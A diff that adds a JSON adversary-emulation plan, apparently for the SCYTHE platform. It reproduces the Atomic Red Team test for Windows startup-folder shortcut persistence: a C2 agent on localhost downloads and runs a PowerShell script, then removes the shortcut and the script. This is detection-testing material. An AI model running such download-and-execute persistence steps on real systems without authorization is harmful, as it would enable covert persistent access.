@@ -1,0 +1,76 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "Please see Atomic Test #7: https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1547.001/T1547.001.md#atomic-test-7---add-executable-shortcut-link-to-user-startup-folder",
+        "display_name": "T1547-001_Atomic_Test_7",
+        "name": "T1547-001_Atomic_Test_7",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "module": "loader",
+                "module_to_load": "downloader",
+                "request": "--load downloader",
+                "type": "message"
+            },
+            "2": {
+                "depends_on": "6f076e51-2e23-46c2-b88e-4505902f960e",
+                "module": "downloader",
+                "request": "--src \"VFS:/shared/T1547/AtomicTest7.ps1\" --dest \"%USERPROFILE%\\Downloads\\1.ps1\"",
+                "type": "message"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe \"%USERPROFILE%\\Downloads\\1.ps1\"",
+                "rtags": [
+                    "att&ck-technique:T1547.001"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "time": "60",
+                "type": "delay"
+            },
+            "6": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEANUP"
+            },
+            "7": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\calc_exe.lnk\"",
+                "type": "message"
+            },
+            "8": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "cmd.exe /c del \"%USERPROFILE%\\Downloads\\1.ps1\"",
+                "type": "message"
+            },
+            "9": {
+                "module": "controller",
+                "request": "--shutdown",
+                "rtags": [
+                    "scythe",
+                    "att&ck",
+                    "att&ck-tactic:TA0011",
+                    "att&ck-technique:T1219"
+                ],
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29"
+    }
+}
